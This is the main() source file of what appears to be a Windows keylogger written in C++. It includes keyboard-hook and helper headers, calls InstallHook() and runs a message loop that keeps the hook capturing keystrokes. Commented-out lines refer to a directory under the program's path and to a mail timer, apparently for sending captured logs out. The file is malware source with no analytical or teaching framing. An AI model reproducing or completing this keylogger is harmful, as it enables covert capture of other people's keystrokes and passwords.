#include <iostream>

#include "KeybHook.h"
#include "Helper.h"
#include "KeyConstants.h"

int main()
{
    MSG Msg;
 //   IO::MKDir(IO::GetOurPath(true));

    InstallHook();

    while (GetMessage (&Msg, NULL, 0, 0))
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }

//    MailTimer.Stop();
    return 0;
}
